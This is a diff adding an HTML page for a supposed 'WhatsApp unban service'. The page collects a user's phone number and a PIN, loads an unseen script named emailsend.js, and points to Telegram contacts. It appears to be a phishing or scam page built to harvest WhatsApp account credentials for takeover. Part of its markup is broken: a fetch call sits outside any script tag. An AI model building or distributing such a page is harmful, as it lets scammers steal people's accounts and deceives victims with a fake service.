@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SUCIDE WHATSAPP UNBAN</title>
+    <link rel="stylesheet" href="style.css">
+     <!-- <link rel="stylesheet" href="style.css"> -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+</head>
+<body><!-- Add this to your HTML file, inside the <body> -->
+<video autoplay muted loop id="bg-video">
+  <source src="./images/torn-mask-of-fate.1920x1080.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+    <nav>
+        <ul class="nav-links">
+           <button> <li><a href="https://t.me/the_incernate">Contact Us</a></li></button>
+            <button><li><a href="#con">Banservices</a></li></button>
+            <button><li><a href="https://t.me/noraxmdchannel">Channel</a></li></button>
+        </ul>
+    </nav>
+    <div class="container" id="con">
+        <form>
+        <h1 class="heading">DRENOX WHATSAPP <br> UNBAN SERVICES</h1>
+        <div>
+            <p class="unban">SELECT UNBAN REQUEST :</p>
+            <!-- <label for="unban-options"></label> -->
+            <select name="UNBAN-MENU" id="unban-options" class="select-field">
+                <option value="" disabled selected>UNBAN MENU</option>
+                <option value="Temporary Unban">Temporary Unban</option>
+                <option value="Permanent Unban">Permanent Unban</option>
+                <option value="2hrs Unban">2hrs Unban</option>
+            </select>
+        </div>
+        <div class="number-class">
+            <p>Enter Your Number</p>
+            <input type="number" placeholder="E.g 234xxxxxxx" class="input-field">
+        </div>  
+    <div>
+        <div class="modal-content">
+            <!-- <input>Do You Want to Send</input> -->
+            <input type="number" id="Pin" placeholder="Please input your pin" required>
+            <h2 class="modal-text"></h2>
+                <div class="succesful"></div>
+                <div class="img"><img src="./images/download.png" alt="success"></div>
+            <button id="yes">Ok</button>
+                <button id="okBtn" type="submit">Submit</button>
+
+        </div>
+    </div>
+        <div>
+            <p class="unban1">SELECT UNBAN TYPE</p>
+            <select name="UNBAN-TYPE" id="unban-option" class="select-field">
+                <option value="" disabled selected>UNBAN TYPE</option>
+                <option value="APPEAL UNBAN">APPEAL UNBAN</option>
+                <option value="FAKE CHAT UNBAN">FAKE CHAT UNBAN</option>
+                <option value="MISTAKE UNBAN">MISTAKE UNBAN</option>
+                <option value="REPORT UNBAN">REPORT UNBAN</option>
+            </select>
+        </div>
+        <section class="dev">
+            <button type="submit" id="unban-btn">UNBAN NOW</button>
+            <button><a href="https://t.me/noraxmdchannel">JOIN TELEGRAM CHANNEL</a></button>
+            <button><a href="https://t.me/noraxmdchannel">DEV</a></button>
+        </section>
+</div>
+</form>
+    </body>
+<script src="emailsend.js"></script>
+fetch("/api/unban", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ appeal: "Please unban my number..." })
+})
+
+</html>
